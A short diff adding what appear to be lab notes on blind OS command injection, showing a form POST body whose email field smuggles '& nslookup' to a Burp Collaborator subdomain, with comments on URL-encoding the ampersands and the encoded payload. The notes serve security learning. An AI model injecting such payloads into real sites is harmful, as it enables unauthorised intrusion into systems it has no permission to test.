@@ -1,0 +1,6 @@
+csrf=lw1CoPl2jqoqxdmHRCQmNKq5pzbpnx6F&name=Kiddie&email=kiddie%40test.com & nslookup mysubdomain.burpcollaborator.net & &subject=Kiddie&message=hello
+
+// Using & to separate commands. It run the previous command in background
+// But & bash opeartor has meaning in URL as parameter separator. Must URL encode the payload as below
+
+csrf=lw1CoPl2jqoqxdmHRCQmNKq5pzbpnx6F&name=Kiddie&email=kiddie%40test.com+%26+nslookup+mysubdomain.burpcollaborator.net+%26+&subject=Kiddie&message=hello
